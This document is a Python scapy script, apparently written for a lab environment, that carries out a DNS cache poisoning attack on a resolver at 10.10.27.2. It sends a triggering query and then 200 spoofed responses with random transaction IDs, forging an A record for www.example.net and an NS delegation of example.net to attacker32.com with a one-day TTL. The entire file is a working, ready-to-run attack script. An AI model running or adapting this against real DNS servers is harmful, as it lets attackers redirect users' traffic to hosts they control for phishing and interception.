from scapy.all import *
import random
import time
import os

# Attack Configuration
TARGET_DNS_SERVER = "10.10.27.2"
SPOOF_A_RECORD = ("www.example.net", "20.0.6.14")
SPOOF_NS_RECORD = ("example.net", "attacker32.com")
SPOOF_ADD_RECORD = ("attacker32.com", "20.0.8.27")
TTL_VALUE = 86400  # Extended cache time (1 day)
INTERFACE = "br-8f1148536672"  # Replace with actual docker bridge interface
ATTACK_TIMES = 200  # Number of poisoning packets to send (probability attack)

def craft_dns_poison_packet():
    # Generate random DNS ID (core of probability attack)
    dns_id = random.randint(1, 65535)
    
    # Construct DNS Query Section (QD)
    dns_qd = DNSQR(qname=SPOOF_A_RECORD[0], qtype="A", qclass="IN")
    
    # Construct Answer Section (A record)
    ans_sec = DNSRR(
        rrname=SPOOF_A_RECORD[0],
        type="A",
        ttl=TTL_VALUE,
        rdata=SPOOF_A_RECORD[1],
        rdlen=4
    )
    
    # Construct Authority Section (NS record)
    ns_sec = DNSRR(
        rrname=SPOOF_NS_RECORD[0],
        type="NS",
        ttl=TTL_VALUE,
        rdata=SPOOF_NS_RECORD[1]
    )
    
    # Construct Additional Section (A record)
    add_sec = DNSRR(
        rrname=SPOOF_ADD_RECORD[0],
        type="A",
        ttl=TTL_VALUE,
        rdata=SPOOF_ADD_RECORD[1],
        rdlen=4
    )
    
    # Construct full DNS packet
    dns_pkt = DNS(
        id=dns_id,
        qd=dns_qd,
        qr=1,
        aa=1,
        rd=0,
        ra=1,
        qdcount=1,
        ancount=1,
        nscount=1,
        arcount=1,
        an=ans_sec,
        ns=ns_sec,
        ar=add_sec
    )
    
    # Construct IP + UDP packet
    ip_pkt = IP(dst=TARGET_DNS_SERVER, src=SPOOF_ADD_RECORD[1])
    udp_pkt = UDP(dport=53, sport=53)
    
    # Combine all layers
    spoof_pkt = ip_pkt / udp_pkt / dns_pkt
    return spoof_pkt

def trigger_dns_query():
    # Trigger DNS server to query target domain (improve attack success rate)
    query_pkt = IP(dst=TARGET_DNS_SERVER) / UDP(dport=53) / DNS(
        rd=1,
        qd=DNSQR(qname=SPOOF_A_RECORD[0], qtype="A")
    )
    send(query_pkt, iface=INTERFACE, verbose=0)
    print("Triggered DNS query to target DNS server")

def dns_cache_poisoning():
    # Check root privilege
    if os.geteuid() != 0:
        print("Error: Must run with root privileges (sudo python3 script.py)")
        exit(1)
    
    # Trigger DNS query first
    trigger_dns_query()
    time.sleep(0.1)
    
    # Send poisoning packets (probability attack)
    print(f"Starting DNS cache poisoning attack on {TARGET_DNS_SERVER}...")
    for i in range(ATTACK_TIMES):
        pkt = craft_dns_poison_packet()
        send(pkt, iface=INTERFACE, verbose=0)
        if (i+1) % 20 == 0:
            print(f"Sent {i+1}/{ATTACK_TIMES} poisoning packets")
        time.sleep(0.01)
    
    print("Attack completed! Verify DNS server cache now.")

if __name__ == "__main__":
    dns_cache_poisoning()
